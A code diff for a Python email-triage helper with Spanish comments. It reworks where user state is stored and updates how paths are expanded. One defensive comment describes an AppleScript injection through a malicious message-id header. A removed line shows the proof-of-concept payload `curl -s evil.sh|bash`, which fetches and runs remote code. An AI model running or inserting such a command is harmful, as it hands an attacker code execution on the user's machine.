@@ -157,10 +157,82 @@ import json
 import os
 import re
 import sys
+import tempfile
 import unicodedata
 from collections import defaultdict, deque
 from datetime import datetime, timezone
 from typing import Optional
+
+# ════════════════════════════════════════════════════════════════
+# Dónde vive el estado del usuario
+# ════════════════════════════════════════════════════════════════
+# config, logs, calibración y los cuerpos temporales viven FUERA de la carpeta
+# de la skill a propósito: esa carpeta se reemplaza al actualizar y en varios
+# destinos es de sólo lectura. Por eso cuelgan de `~`.
+#
+# Pero `~` no es fiable fuera de un Mac/Linux normal. Comprobado en Mistral
+# Vibe Work: $HOME vale "/", así que `~/.email-triage` resuelve a la RAÍZ y el
+# skill intenta escribir allí. Se resuelve una sola vez, con escotilla
+# explícita, y si no hay hogar utilizable se cae a un temporal — DICIÉNDOLO,
+# porque el estado que no persiste hay que anunciarlo: el fallo silencioso es
+# justo lo que lleva a dar por escrito un registro que nunca se escribió.
+
+ENV_BASE_ESTADO = "EMAIL_TRIAGE_HOME"
+_DIR_ESTADO = ".email-triage"
+
+
+def _hogar_utilizable() -> Optional[str]:
+    """El hogar del usuario, o None si no sirve para colgar estado de él."""
+    hogar = os.path.expanduser("~")
+    if not hogar or hogar == "~":          # expanduser no supo resolverlo
+        return None
+    hogar = os.path.abspath(hogar)
+    if hogar == os.sep:                    # $HOME="/" (Mistral Vibe Work)
+        return None
+    return hogar if os.path.isdir(hogar) else None
+
+
+def base_estado() -> str:
+    """Directorio de estado: $EMAIL_TRIAGE_HOME, si no `~`, si no un temporal."""
+    forzada = (os.environ.get(ENV_BASE_ESTADO) or "").strip()
+    if forzada:
+        return os.path.abspath(os.path.expanduser(forzada))
+    hogar = _hogar_utilizable()
+    if hogar is not None:
+        return os.path.join(hogar, _DIR_ESTADO)
+    return os.path.join(tempfile.gettempdir(), _DIR_ESTADO)
+
+
+def base_estado_es_efimera() -> bool:
+    """True si no hubo hogar utilizable y el estado va a un temporal.
+
+    Quien lo consulte debe DECÍRSELO al usuario: lo que se escriba ahí puede
+    no estar en la siguiente sesión, y un historial reconstruido de memoria
+    para tapar el hueco es peor que no tener historial.
+    """
+    return (not (os.environ.get(ENV_BASE_ESTADO) or "").strip()
+            and _hogar_utilizable() is None)
+
+
+def ruta_estado(*partes: str) -> str:
+    """Une partes bajo la base de estado resuelta."""
+    return os.path.join(base_estado(), *partes)
+
+
+def _expandir(ruta) -> str:
+    """Sustituto de os.path.expanduser para las rutas de este skill.
+
+    Reencamina `~/.email-triage/...` a base_estado() en vez de dejar que
+    resuelva a "/.email-triage" cuando $HOME no sirve. Cualquier otra ruta se
+    expande como siempre: si el usuario pide una ruta explícita, manda él.
+    """
+    ruta = str(ruta)
+    prefijo = "~/" + _DIR_ESTADO
+    if ruta == prefijo or ruta.startswith(prefijo + "/"):
+        resto = [p for p in ruta[len(prefijo):].split("/") if p]
+        return ruta_estado(*resto)
+    return os.path.expanduser(ruta)
+
 
 TIER_ORDEN = {"ARCHIVE": 0, "READING_LATER": 1, "REVIEW": 2, "REPLY_NEEDED": 3}
 
@@ -1195,7 +1267,7 @@ def cmd_registrar(ruta: str, registro: dict) -> dict:
     except (TypeError, ValueError) as e:
         return {"ok": False, "error": "registro no serializable: %s" % e}
     linea = linea.replace("\r", " ").replace("\n", " ")   # una sola línea
-    ruta = os.path.expanduser(ruta)
+    ruta = _expandir(ruta)
     directorio = os.path.dirname(ruta) or "."
     try:
         _asegurar_dir_privado(directorio)
@@ -1272,7 +1344,7 @@ def _contar_y_ultimas(ruta, n):
 
 def cmd_compactar(ruta: str, max_lineas: int = MAX_CORRECCIONES,
                   dry_run: bool = False) -> dict:
-    ruta = os.path.expanduser(ruta)
+    ruta = _expandir(ruta)
     if not isinstance(max_lineas, int) or isinstance(max_lineas, bool) \
             or max_lineas <= 0:
         max_lineas = MAX_CORRECCIONES
@@ -1458,7 +1530,7 @@ def cmd_verificar_sesion(datos: dict) -> dict:
     if not isinstance(ruta, str):
         return {"ok": False, "error": "ruta debe ser una cadena",
                 "veredicto": "sin_registro", "registrados": 0, "session_id": sid}
-    ruta_exp = os.path.expanduser(ruta)
+    ruta_exp = _expandir(ruta)
 
     encontrados, truncado = [], False
     try:
@@ -1664,7 +1736,7 @@ def _escribir_snapshot_json(obj, ruta, prefijo) -> dict:
     queda la versión íntegra del último, aceptable para ficheros que se
     regeneran recalculando. compactar sí necesita el flock porque compite
     con los appends de registrar sobre el MISMO fichero de datos."""
-    ruta = os.path.expanduser(str(ruta))
+    ruta = _expandir(str(ruta))
     directorio = os.path.dirname(ruta) or "."
     try:
         _asegurar_dir_privado(directorio)
@@ -1710,7 +1782,7 @@ def _calibrar_leer_nucleo(ruta, ttl_dias):
     if not isinstance(ttl_dias, (int, float)) or isinstance(ttl_dias, bool) \
             or ttl_dias <= 0:
         ttl_dias = TTL_CALIBRACION_DIAS   # TTL basura: cae al default, como compactar
-    ruta = os.path.expanduser(str(ruta or RUTA_CALIBRACION))
+    ruta = _expandir(str(ruta or RUTA_CALIBRACION))
     base = {"ok": True, "ruta": ruta, "ttl_dias": ttl_dias}
     if not os.path.exists(ruta):
         return dict(base, vigente=False, perfil=None,
@@ -1763,8 +1835,12 @@ def _calibrar_leer_nucleo(ruta, ttl_dias):
 # una CABECERA del correo, controlada por quien lo envía, y NO pasa por el
 # saneo S0 (que solo toca cuerpo y asunto). Un message-id con una comilla
 # cierra el literal y AppleScript concatena lo que siga:
-#   {"x@y"} & (do shell script "curl -s evil.sh|bash") & {""}
+#   {"x@y"} & (do shell script "<orden arbitraria del atacante>") & {""}
 # Esto convierte la defensa en MECANISMO: escapar SIEMPRE antes de interpolar.
+# El payload literal del PoC vive en los tests (tests/test_triage_helpers.py,
+# TestEscaparApplescript.MID_ATAQUE), que es donde tiene que estar: se EJECUTA contra
+# el escape en vez de quedarse como texto en un comentario que además viaja
+# dentro del paquete exportado y dispara los escáneres del destino.
 
 # Un message-id RFC 5322 normal (ya sin los <>) es dot-atom + '@' + dot-atom:
 # letras, dígitos y unos pocos símbolos. Cualquier cosa fuera de esto es
@@ -2202,7 +2278,8 @@ def cmd_montar_leer_cuerpos(datos: dict) -> dict:
         '-- entre correo nuevo. Sanea cada fichero con "sanitizar" ANTES de\n'
         '-- exponerlo al modelo, y bórralos al terminar (SCRIPT 4).\n'
         % _EXTRACCION_CRUDA
-        + 'set tbodyDir to (do shell script "d=\\"$HOME/.email-triage/tmp\\"; '
+        + 'set tbodyDir to (do shell script '
+        '"d=\\"${EMAIL_TRIAGE_HOME:-$HOME/.email-triage}/tmp\\"; '
         'mkdir -p -m 700 \\"$d\\"; chmod 700 \\"$d\\"; printf %s \\"$d\\"")\n'
         'tell application "Mail"\n'
         '    set acct to account ' + cuenta + '\n'
@@ -2627,7 +2704,7 @@ def _construir_parser():
     sub = p.add_subparsers(dest="cmd", required=True)
     pa = sub.add_parser("ajustes")
     pa.add_argument("--correcciones",
-                    default=os.path.expanduser("~/.email-triage/correcciones.jsonl"))
+                    default=_expandir("~/.email-triage/correcciones.jsonl"))
     ps = sub.add_parser("sanitizar")
     ps.add_argument("--archivo")
     ps.add_argument("--max-chars", type=int, default=1500)
@@ -2637,7 +2714,7 @@ def _construir_parser():
                     help="remitente (display-name) del correo; también S0")
     psc = sub.add_parser("scoring")
     psc.add_argument("--config",
-                     default=os.path.expanduser("~/.email-triage/config.yaml"))
+                     default=_expandir("~/.email-triage/config.yaml"))
     psc.add_argument("--brief", action="store_true",
                      help="salida compacta: solo score/tier/ejes (ahorra tokens)")
     psc.add_argument("--config-veloz", default=None,
@@ -2649,7 +2726,7 @@ def _construir_parser():
                           "combinable con --brief — CM2/F12")
     pv = sub.add_parser("validar-config")
     pv.add_argument("--config",
-                    default=os.path.expanduser("~/.email-triage/config.yaml"))
+                    default=_expandir("~/.email-triage/config.yaml"))
     pr = sub.add_parser("registrar")
     pr.add_argument("--ruta", required=True,
                     help="fichero JSONL destino (append atómico con flock)")
@@ -2663,7 +2740,7 @@ def _construir_parser():
                     help='JSON {"session_id":..,"esperados":N}; sin él, stdin')
     pc = sub.add_parser("compactar")
     pc.add_argument("--archivo",
-                    default=os.path.expanduser("~/.email-triage/correcciones.jsonl"))
+                    default=_expandir("~/.email-triage/correcciones.jsonl"))
     pc.add_argument("--max-lineas", type=int, default=MAX_CORRECCIONES,
                     help="líneas a conservar (por defecto %d)" % MAX_CORRECCIONES)
     pc.add_argument("--dry-run", action="store_true",
